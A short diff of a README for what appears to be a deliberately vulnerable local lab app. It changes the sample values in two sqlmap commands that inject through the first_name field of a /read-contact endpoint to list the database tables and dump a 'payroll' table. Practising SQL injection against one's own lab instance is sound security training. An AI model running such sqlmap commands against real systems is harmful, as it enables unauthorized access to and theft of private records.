@@ -109,7 +109,7 @@ Docker Build:
 
     ```bash
     sqlmap -u http://localhost:8000/read-contact \
-      --data='{"first_name":"doesnt","last_name":"matter"}' \
+      --data='{"first_name":"Andy","last_name":"Matej"}' \
       -p first_name --batch --tables
     ```
 
@@ -117,7 +117,7 @@ Docker Build:
 
     ```bash
     sqlmap -u http://localhost:8000/read-contact \
-      --data='{"first_name":"doesnt","last_name":"matter"}' \
+      --data='{"first_name":"Andy","last_name":"Matej"}' \
       -p first_name --batch -T payroll --dump
     ```
 
